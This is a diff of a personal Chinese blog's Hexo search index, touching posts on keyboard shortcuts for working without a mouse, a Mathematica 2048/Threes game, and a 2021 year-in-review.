@@ -1,135 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>二一——再见，鼠标</title>
-    <url>/2021/10/24/1024.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="introduction"><a href="#introduction" class="headerlink" title="introduction"></a>introduction</h1><p>为了提高工作效率，以及出于对手腕健康的考虑（现在已经有一定程度的肿胀磨损）。在这个<strong>特殊的日子</strong>，我鼠标的最后一点电耗尽之际，我决心抛弃鼠标，将<strong>几乎</strong>所有的操作全部转移到键盘上。</p>
-<span id="more"></span>
-<p>其实相对于普通的电脑使用者来说，我使用鼠标的频率还是比较低的（大概20%的时间，其中大部分都贡献在浏览网页上），然而时不时花个两三秒的时间去点击一个链接还是让我很不爽。</p>
-<p>如果有朝一日我能真正摆脱对鼠标与触控板的依赖，并熟练使用vim，效率甚至比使用鼠标的人高，那便是再好不过的事情了。</p>
-<h1 id="shortcuts"><a href="#shortcuts" class="headerlink" title="shortcuts"></a>shortcuts</h1><p>使用快捷键来代替鼠标的几次点击是最常用，也最重要的键盘操作方式。</p>
-<p>除了Ctrl-C，Ctrl-V，Win+E，Win+R，Ctrl+Alt+Del这类<strong>妇孺皆知</strong>的快捷键以外，还有系统的各种快捷键、应用快捷键等成百上千种快捷键，在等待着我们的学习。</p>
-<h2 id="system-Win"><a href="#system-Win" class="headerlink" title="system (Win)"></a>system (Win)</h2><p>下面说一下我最常用的（上面写的除外）：</p>
-<p>Tab——没这个你怎么移动光标</p>
-<p>↑↓←→——没这个你怎么移动光标</p>
-<p>Ctrl+Shift+Esc——任务管理器</p>
-<p>Ctrl+Shirt+N——新建文件夹</p>
-<p>Win+number——打开在任务栏的程序</p>
-<p>Win+Shift+number——重新打开一个</p>
-<p>Win+X——一些比较常用的功能</p>
-<p>Win+I——设置</p>
-<p>Win+L——注销（防机惨）</p>
-<p>Win+Q——搜索</p>
-<p>Win+Shift+S——截图</p>
-<p>Alt+Tab——在窗口间切换</p>
-<p>Alt+Shift——切换输入法语言</p>
-<p>Alt+F4——关闭窗口</p>
-<p>Alt+Space+X——最大化</p>
-<p>Alt+Space+N——最小化</p>
-<p>Alt+Space+R——还原</p>
-<blockquote>
-<p>tips:<br>①如果你安装了everything/火萤酱/listary之类的工具（别安火萤视频桌面，有证据表明它不安全），你可以双击Ctrl来快速搜索应用，效率大增。</p>
-<p>②Win+R的一些常用的程序名也得记住，如cmd、winver、control、taskmgr、netplwiz、appwiz.cpl、inetcpl.cpl、services.msc、compmgmt.msc等等（这里边程序名基本是英文或者英文缩写，所以大家英语必须要学好才行）</p>
-</blockquote>
-<p>其实系统方面的快捷键还是比较好掌握的，尤其是有了工具的加成，用键盘玩转Win难度其实不大。</p>
-<h2 id="browser-Chrome"><a href="#browser-Chrome" class="headerlink" title="browser (Chrome)"></a>browser (Chrome)</h2><p>浏览器这边就相对来说麻烦一点，因为随便一个网页都有可能有几十上百个超链接，单纯利用Tab键来找到自己想要的页面太费时了。对于chrome来说，有一个好用的插件叫<em>vimium</em>（英文含义是像Vim编辑器一样操作），可以将这些繁琐的操作进行一些简化。</p>
-<blockquote>
-<p>对于vimium，我最常用的快捷键很少，只有以下几个：<br>①f键，可以将页面的超链接与字母进行对应，输入字母就可以跳转到链接。<br>②j键向下滚动，k键向上滚动。（其实PgUp与PgDn也不错）</p>
-</blockquote>
-<p>至于浏览器本身的操作，常用的有以下几个：</p>
-<p>Tab——虽然找超链接不好用，但是填表用这个还是很香的</p>
-<p>F12——懂的都懂</p>
-<p>Ctrl+T——新建标签页</p>
-<p>Ctrl+Shirt+T——恢复关闭的标签页</p>
-<p>Ctrl+W——关闭标签页</p>
-<p>Ctrl+number——切换标签页</p>
-<p>Alt+D/F6——切换到地址栏</p>
-<p>Alt+←/→——后退/前进页面</p>
-<p>Ctrl+D——收藏页面</p>
-<p>Ctrl+F——搜索文本</p>
-<p>Ctrl+H——历史记录</p>
-<p>Ctrl+J——显示下载（自从用IDM后就弃坑了）</p>
-<p>Ctrl+Shift+O——显示收藏夹（这个有点麻烦，找了一会儿才找到）</p>
-<p>？？？——显示设置（只能在地址里输chrome://settings?）</p>
-<p>？？？——显示扩展程序（只能在地址里输chrome://extensions?）</p>
-<h2 id="applications"><a href="#applications" class="headerlink" title="applications"></a>applications</h2><p>（这里只讨论非uwp应用。）</p>
-<p>Alt——光标跳到菜单栏（然后你可以使用方向键定位，也可以按首字母直接跳转对应的菜单）</p>
-<p>Esc——返回</p>
-<p>Ctrl+A——全选</p>
-<p>Ctrl+F——搜索</p>
-<p>Ctrl+N——新建</p>
-<p>Ctrl+O——打开</p>
-<p>Ctrl+S——保存</p>
-<p>Shift+Ctrl+S——另存为</p>
-<p>Ctrl+X——剪切</p>
-<blockquote>
-<p>对devcpp选手：</p>
-<p>F11：编译运行</p>
-<p>F4：断点</p>
-<p>F5：调试/继续</p>
-<p>F7：下一步</p>
-<p>F8：单步进入</p>
-<p>Ctrl+/：添加注释</p>
-<p>对vs/vsc选手：</p>
-<p>Alt+num：切换标签（跟chrome的Ctrl+num相同）</p>
-<p>Ctrl+Alt+N：编译运行</p>
-<p>F9：断点</p>
-<p>F5：调试/继续</p>
-<p>F10：下一步</p>
-<p>F11：单步进入</p>
-<p>Ctrl+/：添加注释</p>
-<p>对vim选手：</p>
-<p>（等学会了再更）</p>
-</blockquote>
-<p>只要不是垃圾的国产软件，大多快捷键会在软件的菜单栏标出来（如图）。每一个软件都会有些自己独特的快捷键，大量记忆就是摆脱鼠标要过的最难一关。当然，善用Alt键与Tab键还是能解决大多数问题，只不过速度要慢一点。</p>
-<p><img src="/2021/10/24/1024/1024.png"></p>
-<p>（但是我现在还不知道如何只用键盘截图只截一部分，这是键盘操作的一个痛点）</p>
-<h2 id="console"><a href="#console" class="headerlink" title="console"></a>console</h2><p>↑/↓——上/下一条命令</p>
-<p>Ctrl+C——中断命令</p>
-<p>Ctrl+V——Win粘贴文本</p>
-<p>Ctrl+Shift+V——linux粘贴文本</p>
-<p>Ctrl+A——Win全选、linux光标移到首位</p>
-<p>Ctrl+E——linux光标移到最后</p>
-<h1 id="alternative"><a href="#alternative" class="headerlink" title="alternative"></a>alternative</h1><p>如果迫不得已要使用键盘无法操作的功能，如crop the screenshot，<del>play games</del>等。需要键盘临时模拟鼠标的话，可以按Alt+Shirt+Numlock来启动鼠标键功能。</p>
-<p>“5”是左键，“+”是右键。</p>
-<p>“5”周围的8个键代表8个方向。</p>
-<p>“0”代表按住，”.”代表释放。</p>
-<blockquote>
-<p>“-“代表右键，”*“代表左右双键，“/”为恢复”5”单击鼠标左键的功能（感觉没啥用）。</p>
-</blockquote>
-<p>因为鼠标键移动的速度很慢，所以这项功能并不是很实用。</p>
-<h1 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h1><p>要想摆脱对鼠标的依赖，就尽早转linux吧。祝各位1024程序员节快乐！</p>
-<h1 id="Updated-on-11-2"><a href="#Updated-on-11-2" class="headerlink" title="Updated on 11,2"></a>Updated on 11,2</h1><p>不得不说网易就**离谱，我用IDM插件白嫖mooc的视频，网易没有检测到。但凡我想用个vimium插件，用键盘点个超链接，就给我弹出这个：</p>
-<p><img src="/2021/10/24/1024/forbidden.png"></p>
-<p>说白了，想做安全，却连最基本的知识产权保护都做不到，开发人员是否得反思一下呢？</p>
-]]></content>
-      <categories>
-        <category>随笔</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>2048的又一次改良</title>
-    <url>/2021/08/02/2048plus.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>闲来无事，我扒出了十年前在网上复制粘贴的mma2048代码，并对其进行了改良，将2048与Threes!结合起来，形成了如下代码。</p>
-<span id="more"></span>
-<p>（由于涉及键盘操作，网页版的编译器无法操作，请自行下载mma8.0及以上版本运行）</p>
-<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line">挪<span class="punctuation">[</span>左<span class="punctuation">]</span> <span class="operator">=</span> <span class="type">#</span> <span class="operator">//.</span> <span class="punctuation">&#123;</span><span class="punctuation">&#123;</span><span class="type">x___</span><span class="operator">,</span> <span class="number">1</span><span class="operator">,</span> <span class="type">a_</span> <span class="operator">/;</span> <span class="variable">a</span> <span class="operator">&gt;</span> <span class="number">1</span><span class="operator">,</span> <span class="type">y___</span><span class="punctuation">&#125;</span> <span class="operator">:&gt;</span> <span class="punctuation">&#123;</span><span class="variable">x</span><span class="operator">,</span> <span class="variable">a</span><span class="operator">,</span> <span class="number">1</span><span class="operator">,</span> <span class="variable">y</span><span class="punctuation">&#125;</span><span class="operator">,</span> <span class="punctuation">&#123;</span><span class="type">x___</span><span class="operator">,</span> </span><br><span class="line">        <span class="type">a_</span> <span class="operator">/;</span> <span class="variable">a</span> <span class="operator">&gt;</span> <span class="number">1</span><span class="operator">,</span> <span class="type">a_</span><span class="operator">,</span> <span class="type">y___</span><span class="punctuation">&#125;</span> <span class="operator">:&gt;</span> <span class="punctuation">&#123;</span><span class="variable">x</span><span class="operator">,</span> <span class="number">2</span> 抓住<span class="punctuation">[</span><span class="variable">a</span><span class="punctuation">]</span><span class="operator">,</span> <span class="number">1</span><span class="operator">,</span> <span class="variable">y</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span> <span class="operator">/.</span> 抓住<span class="punctuation">[</span><span class="type">a_</span><span class="punctuation">]</span> <span class="operator">:&gt;</span> <span class="variable">a</span> <span class="operator">&amp;;</span></span><br><span class="line">挪<span class="punctuation">[</span>上<span class="punctuation">]</span> <span class="operator">=</span> <span class="built_in">Composition</span><span class="punctuation">[</span><span class="built_in">Transpose</span><span class="operator">,</span> 挪<span class="punctuation">[</span>左<span class="punctuation">]</span><span class="operator">,</span> <span class="built_in">Transpose</span><span class="punctuation">]</span><span class="operator">;</span></span><br><span class="line">挪<span class="punctuation">[</span>下<span class="punctuation">]</span> <span class="operator">=</span> <span class="built_in">Composition</span><span class="punctuation">[</span><span class="built_in">Reverse</span><span class="operator">,</span> 挪<span class="punctuation">[</span>上<span class="punctuation">]</span><span class="operator">,</span> <span class="built_in">Reverse</span><span class="punctuation">]</span><span class="operator">;</span></span><br><span class="line">挪<span class="punctuation">[</span>右<span class="punctuation">]</span> <span class="operator">=</span> <span class="built_in">Composition</span><span class="punctuation">[</span><span class="built_in">Transpose</span><span class="operator">,</span> 挪<span class="punctuation">[</span>下<span class="punctuation">]</span><span class="operator">,</span> <span class="built_in">Transpose</span><span class="punctuation">]</span><span class="operator">;</span></span><br><span class="line">加块瓦 <span class="operator">=</span> <span class="built_in">ReplacePart</span><span class="punctuation">[</span><span class="type">#</span><span class="operator">,</span> <span class="built_in">RandomChoice</span><span class="operator">@</span><span class="built_in">Position</span><span class="punctuation">[</span><span class="type">#</span><span class="operator">,</span> <span class="number">1</span><span class="punctuation">]</span> <span class="operator">-&gt;</span> <span class="built_in">RandomChoice</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="number">2</span><span class="operator">,</span> <span class="number">3</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">]</span> <span class="operator">&amp;;</span></span><br><span class="line">按键 <span class="operator">=</span> <span class="built_in">If</span><span class="punctuation">[</span>格子 <span class="operator">!=</span> 挪<span class="punctuation">[</span><span class="type">#</span><span class="punctuation">]</span><span class="punctuation">[</span>格子<span class="punctuation">]</span><span class="operator">,</span> 格子 <span class="operator">=</span> 加块瓦<span class="punctuation">[</span>挪<span class="punctuation">[</span><span class="type">#</span><span class="punctuation">]</span><span class="punctuation">[</span>格子<span class="punctuation">]</span><span class="punctuation">]</span><span class="operator">;</span> 总分 <span class="operator">=</span> <span class="built_in">Total</span><span class="punctuation">[</span><span class="built_in">Total</span><span class="punctuation">[</span>格子<span class="punctuation">]</span><span class="punctuation">]</span><span class="operator">;</span></span><br><span class="line">    <span class="built_in">Which</span><span class="punctuation">[</span><span class="built_in">And</span> <span class="operator">@@</span> <span class="punctuation">(</span>格子 <span class="operator">==</span> 挪<span class="punctuation">[</span><span class="type">#</span><span class="punctuation">]</span><span class="punctuation">[</span>格子<span class="punctuation">]</span> <span class="operator">&amp;</span> <span class="operator">/@</span> <span class="punctuation">&#123;</span>左<span class="operator">,</span> 右<span class="operator">,</span> 上<span class="operator">,</span> 下<span class="punctuation">&#125;</span><span class="punctuation">)</span><span class="operator">,</span> </span><br><span class="line">     状态 <span class="operator">=</span> <span class="string">&quot;你的得分为&quot;</span> <span class="built_in">ToString</span><span class="punctuation">[</span>总分<span class="punctuation">]</span><span class="punctuation">]</span><span class="punctuation">]</span> <span class="operator">&amp;;</span></span><br><span class="line">格子 <span class="operator">=</span> 加块瓦<span class="punctuation">[</span><span class="built_in">ConstantArray</span><span class="punctuation">[</span><span class="number">1</span><span class="operator">,</span> <span class="punctuation">&#123;</span><span class="number">5</span><span class="operator">,</span> <span class="number">5</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">]</span><span class="operator">;</span></span><br><span class="line">状态 <span class="operator">=</span> <span class="string">&quot;&quot;</span><span class="operator">;</span></span><br><span class="line"><span class="built_in">EventHandler</span><span class="punctuation">[</span></span><br><span class="line"> <span class="built_in">Dynamic</span><span class="punctuation">[</span><span class="built_in">ArrayPlot</span><span class="punctuation">[</span><span class="built_in">Log2</span><span class="operator">@</span>格子<span class="operator">/</span><span class="number">17</span><span class="operator">,</span> <span class="built_in">ColorFunction</span> <span class="operator">-&gt;</span> <span class="built_in">Hue</span><span class="operator">,</span> </span><br><span class="line">   <span class="built_in">ColorFunctionScaling</span> <span class="operator">-&gt;</span> <span class="built_in">False</span><span class="operator">,</span> <span class="built_in">Mesh</span> <span class="operator">-&gt;</span> <span class="built_in">All</span><span class="operator">,</span> </span><br><span class="line">   <span class="built_in">Epilog</span> <span class="operator">-&gt;</span> <span class="punctuation">&#123;</span><span class="built_in">MapIndexed</span><span class="punctuation">[</span></span><br><span class="line">      <span class="built_in">Text</span><span class="punctuation">[</span><span class="built_in">If</span><span class="punctuation">[</span><span class="type">#1</span> <span class="operator">==</span> <span class="number">1</span><span class="operator">,</span> <span class="string">&quot;&quot;</span><span class="operator">,</span> <span class="built_in">Style</span><span class="punctuation">[</span><span class="type">#1</span><span class="operator">,</span> <span class="string">&quot;Section&quot;</span><span class="punctuation">]</span><span class="punctuation">]</span><span class="operator">,</span> <span class="type">#2</span> <span class="operator">-</span> <span class="punctuation">&#123;</span><span class="number">0.5</span><span class="operator">,</span> <span class="number">0.5</span><span class="punctuation">&#125;</span><span class="punctuation">]</span> <span class="operator">&amp;,</span> </span><br><span class="line">      <span class="built_in">Transpose</span><span class="operator">@</span><span class="built_in">Reverse</span><span class="operator">@</span>格子<span class="operator">,</span> <span class="punctuation">&#123;</span><span class="number">2</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="operator">,</span> </span><br><span class="line">     <span class="built_in">Text</span><span class="punctuation">[</span><span class="built_in">Style</span><span class="punctuation">[</span>状态<span class="operator">,</span> <span class="built_in">Blue</span><span class="operator">,</span> <span class="number">24</span><span class="punctuation">]</span><span class="operator">,</span> <span class="punctuation">&#123;</span><span class="number">2.5</span><span class="operator">,</span> <span class="number">2</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">]</span><span class="operator">,</span> <span class="punctuation">&#123;</span><span class="string">&quot;LeftArrowKeyDown&quot;</span> <span class="operator">:&gt;</span> </span><br><span class="line">   按键<span class="punctuation">[</span>左<span class="punctuation">]</span><span class="operator">,</span> <span class="string">&quot;RightArrowKeyDown&quot;</span> <span class="operator">:&gt;</span> 按键<span class="punctuation">[</span>右<span class="punctuation">]</span><span class="operator">,</span> <span class="string">&quot;UpArrowKeyDown&quot;</span> <span class="operator">:&gt;</span> 按键<span class="punctuation">[</span>上<span class="punctuation">]</span><span class="operator">,</span> </span><br><span class="line">  <span class="string">&quot;DownArrowKeyDown&quot;</span> <span class="operator">:&gt;</span> 按键<span class="punctuation">[</span>下<span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>
-<p>计分方式就是所有数字的和，不是2048合成就加分的方式，因此得分会缩水50%左右。</p>
-<p>感觉这个版本的难度增加了不少，目前最高分621，我太菜了，有能力的可以在评论区晒分截图。</p>
-<head>
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css" integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
-  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js" integrity="sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4" crossorigin="anonymous"></script>
-  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js" integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa" crossorigin="anonymous"></script>
-</head>
-]]></content>
-      <categories>
-        <category>develop</category>
-      </categories>
-      <tags>
-        <tag>mma</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>博客一周年祭</title>
     <url>/2022/07/06/anniversary.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>其实是github学生包申请的经历。</p>
@@ -288,26 +159,129 @@
       </tags>
   </entry>
   <entry>
-    <title>Twenty-four——my summary of year 2021</title>
-    <url>/2021/12/30/bye2021.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>The year 2021 is another extraordinary year for me. Many shining and gloomy moments happened. To sum up, I still believe my year of 2021 goes smoothly.</p>
-<p><img src="/2021/12/30/bye2021/2021.png"></p>
-<span id="more"></span> 
-<p>The year of 2021 started with disappointment of AFO and frustration of failing in the monthly examination. I knew this was a crux of my life because there were only 5 months left before gaokao but I still had a bunch of things to master. My goal was to reach 600, and I had to prepare for OI, CTF for self-enrollment exam, attend classes and review those unfamiliar knowledge before simultaneously. It’s a very tough work, like walking in the darkness while looking for the correct path myself. The only joyful thing in my “senior 3” was playing table-tennis and taking photos in snowy days after the academic proficiency test ended.</p>
-<p>In winter vacation, to help go through courses I’ve learnt and forgotten in senior 1, I asked my parents to find “one to one” tutoring for my physics and chemistry. Surely I recovered what I learned before and I’ve got a lot of practical skills for exam, but more importantly, my physics tutor told me the prospect of computer science and asked me to work hard on it. I was motivated by him and put more attention to self-enrollment.</p>
-<p>By the end of March, my hard work in CTF has paid off and I succeeded in self-enrollment exam by scu. It’s the first and huge progress I’ve made this year. After the exam, my task became much simpler. I just need to focus on gaokao and got a high score instead.</p>
-<p>Time passed quickly and gaokao finally arrived in a glimpse. Although the difficulty of natural science has raised, I still got a fairly high score in math. However, I messed up in physics and chemistry, which made the overall score just a little more than 600. There were some classmates attending gaokao <strong>in senior 2 with me</strong> and the best score was about 670, but I don’t care. All in all, 605 is still a highlight for student who only takes classes for about one year. </p>
+    <title>2048的又一次改良</title>
+    <url>/2021/08/02/2048plus.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>闲来无事，我扒出了十年前在网上复制粘贴的mma2048代码，并对其进行了改良，将2048与Threes!结合起来，形成了如下代码。</p>
+<span id="more"></span>
+<p>（由于涉及键盘操作，网页版的编译器无法操作，请自行下载mma8.0及以上版本运行）</p>
+<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line">挪<span class="punctuation">[</span>左<span class="punctuation">]</span> <span class="operator">=</span> <span class="type">#</span> <span class="operator">//.</span> <span class="punctuation">&#123;</span><span class="punctuation">&#123;</span><span class="type">x___</span><span class="operator">,</span> <span class="number">1</span><span class="operator">,</span> <span class="type">a_</span> <span class="operator">/;</span> <span class="variable">a</span> <span class="operator">&gt;</span> <span class="number">1</span><span class="operator">,</span> <span class="type">y___</span><span class="punctuation">&#125;</span> <span class="operator">:&gt;</span> <span class="punctuation">&#123;</span><span class="variable">x</span><span class="operator">,</span> <span class="variable">a</span><span class="operator">,</span> <span class="number">1</span><span class="operator">,</span> <span class="variable">y</span><span class="punctuation">&#125;</span><span class="operator">,</span> <span class="punctuation">&#123;</span><span class="type">x___</span><span class="operator">,</span> </span><br><span class="line">        <span class="type">a_</span> <span class="operator">/;</span> <span class="variable">a</span> <span class="operator">&gt;</span> <span class="number">1</span><span class="operator">,</span> <span class="type">a_</span><span class="operator">,</span> <span class="type">y___</span><span class="punctuation">&#125;</span> <span class="operator">:&gt;</span> <span class="punctuation">&#123;</span><span class="variable">x</span><span class="operator">,</span> <span class="number">2</span> 抓住<span class="punctuation">[</span><span class="variable">a</span><span class="punctuation">]</span><span class="operator">,</span> <span class="number">1</span><span class="operator">,</span> <span class="variable">y</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span> <span class="operator">/.</span> 抓住<span class="punctuation">[</span><span class="type">a_</span><span class="punctuation">]</span> <span class="operator">:&gt;</span> <span class="variable">a</span> <span class="operator">&amp;;</span></span><br><span class="line">挪<span class="punctuation">[</span>上<span class="punctuation">]</span> <span class="operator">=</span> <span class="built_in">Composition</span><span class="punctuation">[</span><span class="built_in">Transpose</span><span class="operator">,</span> 挪<span class="punctuation">[</span>左<span class="punctuation">]</span><span class="operator">,</span> <span class="built_in">Transpose</span><span class="punctuation">]</span><span class="operator">;</span></span><br><span class="line">挪<span class="punctuation">[</span>下<span class="punctuation">]</span> <span class="operator">=</span> <span class="built_in">Composition</span><span class="punctuation">[</span><span class="built_in">Reverse</span><span class="operator">,</span> 挪<span class="punctuation">[</span>上<span class="punctuation">]</span><span class="operator">,</span> <span class="built_in">Reverse</span><span class="punctuation">]</span><span class="operator">;</span></span><br><span class="line">挪<span class="punctuation">[</span>右<span class="punctuation">]</span> <span class="operator">=</span> <span class="built_in">Composition</span><span class="punctuation">[</span><span class="built_in">Transpose</span><span class="operator">,</span> 挪<span class="punctuation">[</span>下<span class="punctuation">]</span><span class="operator">,</span> <span class="built_in">Transpose</span><span class="punctuation">]</span><span class="operator">;</span></span><br><span class="line">加块瓦 <span class="operator">=</span> <span class="built_in">ReplacePart</span><span class="punctuation">[</span><span class="type">#</span><span class="operator">,</span> <span class="built_in">RandomChoice</span><span class="operator">@</span><span class="built_in">Position</span><span class="punctuation">[</span><span class="type">#</span><span class="operator">,</span> <span class="number">1</span><span class="punctuation">]</span> <span class="operator">-&gt;</span> <span class="built_in">RandomChoice</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="number">2</span><span class="operator">,</span> <span class="number">3</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">]</span> <span class="operator">&amp;;</span></span><br><span class="line">按键 <span class="operator">=</span> <span class="built_in">If</span><span class="punctuation">[</span>格子 <span class="operator">!=</span> 挪<span class="punctuation">[</span><span class="type">#</span><span class="punctuation">]</span><span class="punctuation">[</span>格子<span class="punctuation">]</span><span class="operator">,</span> 格子 <span class="operator">=</span> 加块瓦<span class="punctuation">[</span>挪<span class="punctuation">[</span><span class="type">#</span><span class="punctuation">]</span><span class="punctuation">[</span>格子<span class="punctuation">]</span><span class="punctuation">]</span><span class="operator">;</span> 总分 <span class="operator">=</span> <span class="built_in">Total</span><span class="punctuation">[</span><span class="built_in">Total</span><span class="punctuation">[</span>格子<span class="punctuation">]</span><span class="punctuation">]</span><span class="operator">;</span></span><br><span class="line">    <span class="built_in">Which</span><span class="punctuation">[</span><span class="built_in">And</span> <span class="operator">@@</span> <span class="punctuation">(</span>格子 <span class="operator">==</span> 挪<span class="punctuation">[</span><span class="type">#</span><span class="punctuation">]</span><span class="punctuation">[</span>格子<span class="punctuation">]</span> <span class="operator">&amp;</span> <span class="operator">/@</span> <span class="punctuation">&#123;</span>左<span class="operator">,</span> 右<span class="operator">,</span> 上<span class="operator">,</span> 下<span class="punctuation">&#125;</span><span class="punctuation">)</span><span class="operator">,</span> </span><br><span class="line">     状态 <span class="operator">=</span> <span class="string">&quot;你的得分为&quot;</span> <span class="built_in">ToString</span><span class="punctuation">[</span>总分<span class="punctuation">]</span><span class="punctuation">]</span><span class="punctuation">]</span> <span class="operator">&amp;;</span></span><br><span class="line">格子 <span class="operator">=</span> 加块瓦<span class="punctuation">[</span><span class="built_in">ConstantArray</span><span class="punctuation">[</span><span class="number">1</span><span class="operator">,</span> <span class="punctuation">&#123;</span><span class="number">5</span><span class="operator">,</span> <span class="number">5</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">]</span><span class="operator">;</span></span><br><span class="line">状态 <span class="operator">=</span> <span class="string">&quot;&quot;</span><span class="operator">;</span></span><br><span class="line"><span class="built_in">EventHandler</span><span class="punctuation">[</span></span><br><span class="line"> <span class="built_in">Dynamic</span><span class="punctuation">[</span><span class="built_in">ArrayPlot</span><span class="punctuation">[</span><span class="built_in">Log2</span><span class="operator">@</span>格子<span class="operator">/</span><span class="number">17</span><span class="operator">,</span> <span class="built_in">ColorFunction</span> <span class="operator">-&gt;</span> <span class="built_in">Hue</span><span class="operator">,</span> </span><br><span class="line">   <span class="built_in">ColorFunctionScaling</span> <span class="operator">-&gt;</span> <span class="built_in">False</span><span class="operator">,</span> <span class="built_in">Mesh</span> <span class="operator">-&gt;</span> <span class="built_in">All</span><span class="operator">,</span> </span><br><span class="line">   <span class="built_in">Epilog</span> <span class="operator">-&gt;</span> <span class="punctuation">&#123;</span><span class="built_in">MapIndexed</span><span class="punctuation">[</span></span><br><span class="line">      <span class="built_in">Text</span><span class="punctuation">[</span><span class="built_in">If</span><span class="punctuation">[</span><span class="type">#1</span> <span class="operator">==</span> <span class="number">1</span><span class="operator">,</span> <span class="string">&quot;&quot;</span><span class="operator">,</span> <span class="built_in">Style</span><span class="punctuation">[</span><span class="type">#1</span><span class="operator">,</span> <span class="string">&quot;Section&quot;</span><span class="punctuation">]</span><span class="punctuation">]</span><span class="operator">,</span> <span class="type">#2</span> <span class="operator">-</span> <span class="punctuation">&#123;</span><span class="number">0.5</span><span class="operator">,</span> <span class="number">0.5</span><span class="punctuation">&#125;</span><span class="punctuation">]</span> <span class="operator">&amp;,</span> </span><br><span class="line">      <span class="built_in">Transpose</span><span class="operator">@</span><span class="built_in">Reverse</span><span class="operator">@</span>格子<span class="operator">,</span> <span class="punctuation">&#123;</span><span class="number">2</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="operator">,</span> </span><br><span class="line">     <span class="built_in">Text</span><span class="punctuation">[</span><span class="built_in">Style</span><span class="punctuation">[</span>状态<span class="operator">,</span> <span class="built_in">Blue</span><span class="operator">,</span> <span class="number">24</span><span class="punctuation">]</span><span class="operator">,</span> <span class="punctuation">&#123;</span><span class="number">2.5</span><span class="operator">,</span> <span class="number">2</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">]</span><span class="operator">,</span> <span class="punctuation">&#123;</span><span class="string">&quot;LeftArrowKeyDown&quot;</span> <span class="operator">:&gt;</span> </span><br><span class="line">   按键<span class="punctuation">[</span>左<span class="punctuation">]</span><span class="operator">,</span> <span class="string">&quot;RightArrowKeyDown&quot;</span> <span class="operator">:&gt;</span> 按键<span class="punctuation">[</span>右<span class="punctuation">]</span><span class="operator">,</span> <span class="string">&quot;UpArrowKeyDown&quot;</span> <span class="operator">:&gt;</span> 按键<span class="punctuation">[</span>上<span class="punctuation">]</span><span class="operator">,</span> </span><br><span class="line">  <span class="string">&quot;DownArrowKeyDown&quot;</span> <span class="operator">:&gt;</span> 按键<span class="punctuation">[</span>下<span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>
+<p>计分方式就是所有数字的和，不是2048合成就加分的方式，因此得分会缩水50%左右。</p>
+<p>感觉这个版本的难度增加了不少，目前最高分621，我太菜了，有能力的可以在评论区晒分截图。</p>
+<head>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css" integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js" integrity="sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4" crossorigin="anonymous"></script>
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js" integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa" crossorigin="anonymous"></script>
+</head>
